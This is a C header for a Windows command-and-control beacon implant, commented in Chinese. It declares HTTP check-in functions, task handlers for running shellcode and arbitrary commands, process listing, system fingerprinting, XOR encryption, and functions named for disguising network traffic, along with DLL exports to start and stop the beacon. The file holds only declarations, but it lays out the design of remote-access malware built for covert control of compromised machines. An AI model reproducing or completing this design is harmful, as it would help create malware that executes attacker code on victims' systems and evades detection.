#ifndef BEACON_H
#define BEACON_H

#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <psapi.h>
#include <stdarg.h>
#include <tlhelp32.h>
#include "config.h"

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "psapi.lib")
#pragma warning(disable : 4996)

// DLL导出宏定义
#ifdef BUILD_DLL
#define BEACON_API __declspec(dllexport)
#else
#define BEACON_API
#endif

// Beacon配置结构
typedef struct {
    WCHAR uuid[UUID_LENGTH];
    WCHAR client_id[UUID_LENGTH];
    WCHAR api_path[MAX_PATH_LENGTH];
    DWORD sleep_time;
} BEACON_CONFIG;

// HTTP请求结构
typedef struct {
    WCHAR* method;
    WCHAR* path;
    char* data;
    size_t data_len;
    DWORD timeout;
    BOOL use_ssl;
} HTTP_REQUEST;

// 进程信息结构
typedef struct {
    DWORD pid;
    char name[MAX_PATH];
    char path[MAX_PATH];
    char username[MAX_PATH];
} PROCESS_INFO;

// Base64编码表
extern const char base64_table[];

// 全局变量
extern BEACON_CONFIG g_config;
extern volatile BOOL g_beacon_running;

// 全局变量初始化和清理
BEACON_ERROR init_globals(void);
void cleanup_globals(void);

// 核心函数声明
BEACON_ERROR beacon_init(BEACON_CONFIG* config);
BEACON_ERROR beacon_run(BEACON_CONFIG* config);
void beacon_cleanup(BEACON_CONFIG* config);

// DLL导出函数
#ifdef BUILD_DLL
BEACON_API DWORD WINAPI StartBeacon(LPVOID lpParam);
BEACON_API BOOL WINAPI StopBeacon(void);
#endif

// 任务处理函数
BEACON_ERROR execute_task(const char* task_data, size_t data_len, BEACON_CONFIG* config);
BEACON_ERROR handle_sleep_task(const char* task_data, BEACON_CONFIG* config);
BEACON_ERROR handle_proclist_task(const char* task_data, BEACON_CONFIG* config);
BEACON_ERROR handle_shellcode_task(const char* task_data, size_t data_len, BEACON_CONFIG* config);
BEACON_ERROR handle_execute_task(const char* task_data, BEACON_CONFIG* config);

// 网络通信函数
BEACON_ERROR http_init(void);
BEACON_ERROR http_send_request(HTTP_REQUEST* request, char** response, DWORD* response_len);
void http_cleanup(void);

// 系统信息收集函数
BEACON_ERROR collect_system_info(char** json_data);
BEACON_ERROR get_process_list(char** json_data);
BEACON_ERROR get_system_uuid(WCHAR* uuid);

// 工具函数
void base64_encode(const unsigned char* input, size_t length, char** output);
BEACON_ERROR base64_decode(const char* input, void** output, size_t* output_size);
BEACON_ERROR get_product_id(char* product_id, size_t size);
void xor_encrypt_decrypt(unsigned char* data, size_t data_len, const char* key, size_t key_len);

// 流量伪装函数
char* wrap_data_with_disguise(const char* data);
char* unwrap_data_from_disguise(const char* wrapped_data);

// 执行命令并获取输出
BEACON_ERROR execute_command(const char* command, char** output);

#endif // BEACON_H 